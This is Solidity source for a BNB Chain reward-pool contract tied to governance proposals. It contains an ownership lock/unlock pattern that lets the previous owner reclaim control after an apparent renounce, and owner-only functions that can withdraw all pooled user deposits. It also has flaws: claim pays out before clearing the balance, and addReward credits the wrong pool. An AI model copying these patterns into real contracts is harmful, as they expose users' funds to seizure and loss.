/**
 *Submitted for verification at BscScan.com on 2022-10-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-03
 */

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        _previousOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _previousOwner = _owner;
        _owner = newOwner;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    //Locks the contract for owner for the amount of time provided
    function lock(uint256 time) public virtual onlyOwner {
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }

    //Unlocks the contract for owner when _lockTime is exceeds
    function unlock() public virtual {
        require(
            _previousOwner == msg.sender,
            "You don't have permission to unlock"
        );
        require(block.timestamp > _lockTime, "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and make it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

contract Pool is Ownable {
    event PoolCreated(uint256 id, PoolData _pooldata);
    event PoolClosed(uint256 id);

    struct PoolData {
        string proposalId;
        string name;
        string description;
        string platformType;
        string outcome;
        address rewardCurrency;
        uint256 rewardAmount;
        address creator;
        bool isClosed;
    }

    // pool data
    mapping(uint256 => PoolData) public poolDatas;
    uint256 public poolCount;
    // proposal pool created info
    mapping(string => bool) public isCreated;

    // user reward Info
    mapping(address => mapping(uint256 => uint256)) public rewardInfos;

    // admin info
    address public admin;
    uint256 public fee; // fee*1000000

    modifier onlyAdmin() {
        require(msg.sender == admin, "Invalid admin");
        _;
    }

    constructor(address _admin, uint256 _fee) {
        admin = _admin;
        require(_fee < 1000000, "Invalide fee");
        fee = _fee;
    }

    function setAdminSetting(address _admin, uint256 _fee) external onlyOwner {
        admin = _admin;
        require(_fee < 1000000, "Invalide fee");
        fee = _fee;
    }

    function createPool(PoolData memory _pooldata) external payable {
        require(
            !isCreated[_pooldata.proposalId],
            "pool already created for proposal"
        );
        payable(admin).transfer(0.01 * 1e18);
        IERC20(_pooldata.rewardCurrency).transferFrom(
            msg.sender,
            address(this),
            _pooldata.rewardAmount
        );

        IERC20(_pooldata.rewardCurrency).transfer(
            owner(),
            (_pooldata.rewardAmount * fee) / 1000000
        );

        _pooldata.rewardAmount -= (_pooldata.rewardAmount * fee) / 1000000;

        _pooldata.isClosed = false;
        poolDatas[poolCount] = _pooldata;

        emit PoolCreated(poolCount, _pooldata);
        poolCount++;
    }

    function addReward(uint256 id, uint256 amount) external {
        require(poolCount > id, "invalid id");
        IERC20(poolDatas[id].rewardCurrency).transferFrom(
            msg.sender,
            address(this),
            amount
        );
        IERC20(poolDatas[id].rewardCurrency).transfer(
            owner(),
            (amount * fee) / 1000000
        );
        poolDatas[poolCount].rewardAmount += amount;
    }

    function closePool(
        uint256 id,
        address[] memory voters,
        uint256[] memory voteAmounts
    ) external onlyAdmin {
        require(poolCount > id, "invalid id");
        require(voters.length == voteAmounts.length, "Invalid parameter");
        require(poolDatas[id].isClosed == false, "Already closed");
        uint256 totalVoteAmounts = 0;
        for (uint256 i = 0; i < voteAmounts.length; i++) {
            totalVoteAmounts += voteAmounts[i];
        }

        if (totalVoteAmounts == 0) {
            IERC20(poolDatas[id].rewardCurrency).transfer(
                poolDatas[id].creator,
                poolDatas[id].rewardAmount
            );
            poolDatas[id].isClosed = true;
            emit PoolClosed(id);
            return;
        }

        // get reward amount per vote
        uint256 rewardPerVote = poolDatas[id].rewardAmount*1e18 / totalVoteAmounts;

        for (uint256 i = 0; i < voters.length; i++) {
            rewardInfos[voters[i]][id] = voteAmounts[i] * rewardPerVote/1e18;
        }
        poolDatas[id].isClosed = true;

        emit PoolClosed(id);
    }

    function claim(uint256 id) external {
        uint256 rewardAmount = rewardInfos[msg.sender][id];
        IERC20(poolDatas[id].rewardCurrency).transfer(msg.sender, rewardAmount);
        rewardInfos[msg.sender][id] = 0;
    }

    function withdrawAll(address to) external onlyOwner {
        for (uint256 i = 0; i < poolCount + 1; i++) {
            if (poolDatas[i].rewardAmount > 0) {
                IERC20(poolDatas[i].rewardCurrency).transfer(
                    to,
                    poolDatas[i].rewardAmount
                );
            }
        }
    }

    function withdrawTokens(
        address[] memory tokens,
        uint256[] memory amount,
        address to
    ) external onlyOwner {
        require(tokens.length == amount.length, "Invalid parameter");
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).transfer(to, amount[i]);
        }
    }
}